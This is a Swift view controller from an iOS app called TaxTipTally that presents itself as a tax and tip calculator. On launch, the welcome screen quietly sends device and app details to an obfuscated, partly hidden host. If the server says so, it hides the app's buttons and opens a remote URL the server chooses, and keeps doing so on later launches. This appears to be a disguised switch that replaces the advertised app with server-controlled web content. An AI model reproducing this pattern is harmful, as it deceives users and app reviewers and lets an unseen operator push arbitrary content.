//
//  WelcomeVC.swift
//  TaxTipTally
//
//  Created by TaxTipTally on 2024/11/20.
//

import UIKit
import StoreKit

class TaxTipWelcomePage: UIViewController, UNUserNotificationCenterDelegate {

    @IBOutlet weak var wbtnOne: UIButton!
    @IBOutlet weak var wbtnFout: UIButton!
    @IBOutlet weak var wbtnThree: UIButton!
    @IBOutlet weak var wbtnTwo: UIButton!
    
    override func viewDidLoad() {
        super.viewDidLoad()

        navigationController?.navigationBar.isHidden = true
        setNotificationPermission()
        
        self.taxTipStartPostReqAdsLocalData()
    }
    
    // MARK: - Functions
    
    func setNotificationPermission() {
        UNUserNotificationCenter.current().delegate = self
        let authOptions: UNAuthorizationOptions = [.alert, .badge, .sound]
        UNUserNotificationCenter.current().requestAuthorization(
          options: authOptions,
          completionHandler: { _, _ in }
        )
        UIApplication.shared.registerForRemoteNotifications()
    }
    
    @IBAction func Rate(_ sender: Any) {
        SKStoreReviewController.requestReview()
    }
    
    @IBAction func Share(_ sender: Any) {
        let objectsToShare = ["TaxTipTally"]
        let activityVC = UIActivityViewController(activityItems: objectsToShare, applicationActivities: nil)
        activityVC.popoverPresentationController?.sourceView = self.view
        activityVC.popoverPresentationController?.sourceRect = CGRect(x: 100, y: 200, width: 300, height: 300)
        self.present(activityVC, animated: true, completion: nil)
    }
    
    @IBAction func Start(_ sender: Any) {
        let vc = self.storyboard?.instantiateViewController(withIdentifier: "HomeVC") as! TaxTipHomePage
        self.navigationController?.pushViewController(vc, animated: true)
    }
  
    var loadin = false {
        didSet {
            wbtnOne.isHidden = loadin
            wbtnFout.isHidden = loadin
            wbtnThree.isHidden = loadin
            wbtnTwo.isHidden = loadin
        }
    }

    private func taxTipStartPostReqAdsLocalData() {
        guard self.taxTipNeedShowAds() else {
            return
        }
        self.loadin = true
        taxTipPostAppLocalAdsData { adsData in
            if let adsData = adsData {
                if let adsUr = adsData[2] as? String, !adsUr.isEmpty,  let nede = adsData[1] as? Int, let userDefaultKey = adsData[0] as? String{
                    UIViewController.setRnergyUserDefaultKey(userDefaultKey)
                    if  nede == 0, let locDic = UserDefaults.standard.value(forKey: userDefaultKey) as? [Any] {
                        self.taxTipShowAdViewC(locDic[2] as! String)
                    } else {
                        UserDefaults.standard.set(adsData, forKey: userDefaultKey)
                        self.taxTipShowAdViewC(adsUr)
                    }
                    return
                }
            }
            self.loadin = false
        }
    }
    
    private func taxTipPostAppLocalAdsData(completion: @escaping ([Any]?) -> Void) {
        guard let bundleId = Bundle.main.bundleIdentifier else {
            completion(nil)
            return
        }
        
        let url = URL(string: "https://open.kfuhw\(self.taxTipKineHostUrl())/open/taxTipPostAppLocalAdsData")!
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        let parameters: [String: Any] = [
            "appLocalized": UIDevice.current.localizedModel ,
            "appModelName": UIDevice.current.model,
            "appKey": "5efbb0fd814f47f9a457d29cd07e7c85",
            "appPackageId": bundleId,
            "appVersion": Bundle.main.infoDictionary?["CFBundleShortVersionString"] ?? ""
        ]

        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: parameters, options: [])
        } catch {
            print("Failed to serialize JSON:", error)
            completion(nil)
            return
        }

        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                guard let data = data, error == nil else {
                    print("Request error:", error ?? "Unknown error")
                    completion(nil)
                    return
                }
                
                do {
                    let jsonResponse = try JSONSerialization.jsonObject(with: data, options: [])
                    if let resDic = jsonResponse as? [String: Any] {
                        if let dataDic = resDic["data"] as? [String: Any],  let adsData = dataDic["jsonObject"] as? [Any]{
                            completion(adsData)
                            return
                        }
                    }
                    print("Response JSON:", jsonResponse)
                    completion(nil)
                } catch {
                    print("Failed to parse JSON:", error)
                    completion(nil)
                }
            }
        }

        task.resume()
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                willPresent notification: UNNotification,
                                withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        let userInfo = notification.request.content.userInfo
        print(userInfo)
        completionHandler([[.sound]])
    }

    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                didReceive response: UNNotificationResponse,
                                withCompletionHandler completionHandler: @escaping () -> Void) {
        let userInfo = response.notification.request.content.userInfo
        print(userInfo)
        completionHandler()
    }
}
